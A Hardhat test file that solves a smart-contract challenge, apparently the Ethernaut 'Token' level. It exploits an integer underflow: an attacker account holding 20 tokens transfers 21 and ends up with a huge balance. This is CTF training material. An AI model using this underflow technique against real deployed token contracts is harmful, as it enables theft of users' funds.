const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const CONTRACT_NAME = "Token";

describe(CONTRACT_NAME, () => {
  async function deployLoadFixture() {
    const [owner, attacker] = await ethers.getSigners();

    const Token = await ethers.getContractFactory(CONTRACT_NAME);
    const token = await Token.deploy(10000);

    return { token, owner, attacker };
  }

  it("Challenge solved", async () => {
    let tx;
    let { token, owner, attacker } = await loadFixture(deployLoadFixture);

    // init with 20 tokens
    tx = await token.transfer(attacker.address, 20);
    tx.wait();

    // steal big number of tokens
    token = token.connect(attacker);
    tx = await token.transfer(owner.address, 21); // ! making underflow
    await tx.wait();

    // test
    tx = await token.balanceOf(attacker.address);
    expect(tx).to.be.greaterThan(20);
  });
});
